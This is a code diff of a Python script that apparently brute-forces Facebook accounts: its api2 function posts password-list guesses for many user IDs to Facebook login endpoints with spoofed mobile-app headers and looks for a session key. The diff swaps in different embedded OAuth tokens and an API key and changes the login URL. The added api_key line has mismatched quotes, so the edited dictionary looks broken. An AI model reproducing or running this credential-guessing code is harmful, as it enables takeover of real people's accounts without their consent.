@@ -1,6 +1,7 @@
 from os import path
 import os,base64,zlib,pip,urllib
 print('\n\033[1;37m install modules...\n It will take some seconds...')
+
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
@@ -734,7 +735,8 @@ def api2(ids,names,passlist):
                                         'content-type':'application/x-www-form-urlencoded',
                                         'x-fb-sim-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-type':'mobile.CTRadioAccessTechnologyLTE',
-                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                        'Authorization':'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662',
+                                        'api_key": "882a8490361da98702bf97a021ddc14d',
                                         'user-agent':ua_string,
                                         'x-fb-net-hni':str(random.randint(20000, 40000)),
                                         'x-fb-connection-bandwidth':str(random.randint(20000000, 30000000)),
@@ -742,7 +744,7 @@ def api2(ids,names,passlist):
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
                                         'x-fb-http-engine':     'Liger'}
-                                url = 'https://b-graph.facebook.com/auth/login'
+                                url = 'https://api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
